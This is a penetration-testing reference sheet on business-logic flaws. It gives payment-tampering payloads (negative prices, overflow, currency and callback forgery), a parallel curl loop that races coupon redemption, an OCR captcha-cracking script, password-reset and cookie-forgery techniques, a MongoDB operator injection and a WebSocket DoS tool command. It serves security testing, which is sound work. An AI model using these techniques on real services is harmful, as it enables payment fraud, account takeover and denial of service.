# Business Logic Vulnerabilities — Extended Scenarios

> Companion to [SKILL.md](./SKILL.md). Contains payment security, captcha bypass, password reset flaws, user enumeration, and traversal attack scenarios.

---

## 1. Payment Precision and Overflow Attacks

### Integer Overflow

```text
# 32-bit signed int max: 2,147,483,647
# If quantity or price field is int32:
quantity: 2147483648 → overflows to negative → credit instead of debit

# In C/Java: int amount = price * quantity;
# If both are large positive → result wraps to negative
```

### Decimal Precision Exploitation

```text
# Item price: ¥10.00, quantity supports decimals:
quantity: 0.001  → charge: ¥0.01 (rounds down)
# But you still receive 1 item

# Partial refund manipulation:
# Original order: 3 items × ¥100 = ¥300
# Request refund for 2.9 items → refund ¥290 → keep all 3 items
```

### Negative Value Attacks

```text
# Negative quantity:
{"item": "laptop", "quantity": -1, "price": 999}
→ Total: -¥999 → credit to account

# Negative shipping fee:
{"shipping_method": "express", "shipping_fee": -50}
→ Reduces total order cost

# Negative discount:
{"discount_amount": -100}
→ Adds ¥100 instead of subtracting
```

### Payment Parameter Tampering

Parameters to test modifying via Burp:

```text
price / amount / total         → change to 0.01
discount_code / coupon_id      → reuse / stack
currency / currency_code       → change to weaker currency
payment_method / gateway       → switch to test/sandbox gateway
installments / period          → change to 0 or negative
account_id / receiver          → change to attacker's account
return_url / notify_url        → change to attacker's server (capture payment confirmation)
```

---

## 2. Condition Race — Practical Patterns

### One-Coupon-Per-Order Bypass

```bash
# Send 20 parallel requests using the same coupon:
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/apply-coupon \
    -H "Cookie: session=..." \
    -d "coupon=SAVE50&order_id=12345" &
done
wait
# If check and deduction are non-atomic → multiple applications succeed
```

### Gift Card Double-Spend

```text
# Burp Repeater: duplicate the redemption request 10 times
# "Send group in parallel" (Turbo Intruder or Repeater Groups)
# Race window: balance check → deduction
# Multiple threads pass the balance check before any deduction commits
```

---

## 3. Captcha Bypass Techniques

### Drop the Verification Request

```text
# Normal flow:
1. Browser requests captcha image from /api/captcha
2. User enters captcha text
3. Form submits with captcha value

# Bypass: Use Burp to DROP the request to /api/captcha
# The server-side captcha remains the same → use the same captcha value repeatedly
```

### Remove the Captcha Parameter

```text
# If backend checks: "if verifycode parameter exists, validate it"
# Remove the parameter entirely from the request:
# Before: username=admin&password=test&verifycode=abc123
# After:  username=admin&password=test
# → Old code path without captcha validation
```

### Reset Captcha Failure Counter

```text
# Some apps track failed attempts in session/cookie
# Clear cookies between attempts → failure counter resets to 0
# Or: create new session for each brute force attempt
```

### OCR-Based Captcha Cracking

```python
from PIL import Image
import pytesseract

# pip install pytesseract Pillow
# brew install tesseract (macOS)

img = Image.open("captcha.png")
text = pytesseract.image_to_string(img)
print(f"Captcha: {text.strip()}")
# Accuracy improves with preprocessing: grayscale, threshold, denoise
```

---

## 4. Arbitrary Password Reset Vulnerabilities

### Predictable Reset Token

```text
# Token patterns that are attackable:
token = md5(username)           → compute for any user
token = md5(email + timestamp)  → narrow brute force window
token = base64(user_id)         → trivially reversible
token = sequential_number       → enumerate
token = username + 4_digit_rand → brute force 0000-9999
```

### Session Replacement Attack

```text
# Flow: Reset password for your own account
# Step 1: Request reset for YOUR email → receive link
# Step 2: Click link → reach "enter new password" page
# Step 3: In the same session, change the username/email parameter to VICTIM
# Step 4: Submit new password → server uses session state (which user) not the parameter
# If session tracks "reset in progress" but not "for which user" → reset victim's password
```

### Registration Overwrite

```text
# If username is unique but registration doesn't check existing accounts properly:
# Register with victim's username → old account is overwritten or merged
# Now login with the password you just set → access victim's data
```

---

## 5. User Information Enumeration

### Login Error Message Difference

```text
# Vulnerable:
username: admin     → "Incorrect password" (confirms user exists)
username: nonexist  → "User not found" (confirms user doesn't exist)

# Secure:
Both cases → "Invalid username or password"
```

### Masked Data Reconstruction

```text
# Phone number masking: 138****5678
# Email masking: a****@gmail.com
# If different endpoints mask differently:
#   Endpoint A: 138****5678
#   Endpoint B: 1384***5678
#   Endpoint C: 13845**678
# Combine → reconstruct: 13845675678
```

### Cookie-Based Authorization Bypass

```text
# Cookie: uid=dXNlcjE=  (base64 of "user1")
# Change to: uid=YWRtaW4x  (base64 of "admin1")
# If server trusts the cookie without server-side session validation → vertical privilege escalation
```

---

## 6. Functional Restriction Bypass

### Array Parameter for Multiple Coupons

```text
# Normal: couponid=SAVE20 (one coupon per order)
# Bypass: couponid[0]=SAVE20&couponid[1]=SAVE30
# Or JSON: {"coupon_ids": ["SAVE20", "SAVE30", "WELCOME10"]}
# If backend iterates the array and applies each → stacks discounts beyond limit
```

### Frontend-Only Restrictions

```text
# HTML: <input type="text" disabled="disabled" readonly="readonly" value="110010">
# Developer Tools: remove disabled/readonly attributes → field becomes editable
# Or: Burp intercepts response → removes disabled attribute → user can modify
# Or: directly craft POST request with modified value
```

---

## 7. Denial of Service via Business Logic

### Application-Layer DoS (not DDoS)

```text
# Single malformed request causes CPU spike:
# CVE-2015-4024: PHP multipart/form-data with crafted boundary → regex backtracking
# CVE-2020-13935: Tomcat WebSocket with crafted frames → infinite loop
# CVE-2013-2028: Nginx chunked transfer with negative size → buffer overflow

# Tools:
# tcdos — WebSocket DoS tool:
python3 tcdos.py -u ws://target/endpoint -t 10
```

---

## 8. PAYMENT MANIPULATION MATRIX

| # | Attack | Method |
|---|---|---|
| 1 | Price parameter tampering | Change `amount=100` to `amount=1` in checkout request |
| 2 | Negative quantity/amount | `quantity=-1` or `amount=-100` for refund credit |
| 3 | Currency confusion | Change `currency=USD` to `currency=IDR` (lower value) |
| 4 | Callback notification forgery | Forge payment gateway callback to mark order as paid |
| 5 | Race condition on payment | Concurrent checkout with same cart → duplicate purchase at single price |
| 6 | Coupon stacking | Apply same coupon multiple times or combine incompatible coupons |
| 7 | Refund without return | Initiate refund flow but skip item return step |
| 8 | Payment status manipulation | Change order status from "pending" to "paid" via API |
| 9 | Split transaction bypass | Split large amount into multiple small amounts below verification threshold |
| 10 | MongoDB operator injection | `{"price": {"$gt": 0}}` instead of numeric value |

### Testing Methodology

```
1. Map the complete payment flow (cart → checkout → payment → callback → confirmation)
2. At each step, test: parameter tampering, step skipping, replay, race condition
3. Check if price is recalculated server-side or trusts client value
4. Test callback endpoint: Does it verify signature? Source IP? Idempotency?
5. Test refund flow separately: same vulnerabilities may exist in reverse
```

---

## 9. STATE MACHINE BYPASS METHODOLOGY

### Common Multi-Step Process Attacks

| Attack | How |
|---|---|
| Frontend step skip | Navigate directly to final step URL (e.g., `/step3` without completing step 1-2) |
| Response manipulation | Change `{"step":"1","allowed":"false"}` to `{"step":"3","allowed":"true"}` |
| Direct state modification | API call to change order status: `PUT /order/123 {"status":"completed"}` |
| Replay previous step | Complete step 2, then replay step 1 with modified data |
| Session swap | Start flow as user A, complete as user B (different session) |

### Verification Bypass Pattern

```
Step 1: Request verification code → code sent to email/phone
Step 2: Enter verification code → server validates
Step 3: Set new password → server allows

Attack: Skip step 2 entirely
- Try: POST /reset-password directly (step 3 URL)
- Try: Response manipulation — change step 2 response from "fail" to "success"
- Try: DOM manipulation — remove disabled attribute from step 3 form
- Try: Modify cookie/session to reflect "step 2 completed"
```
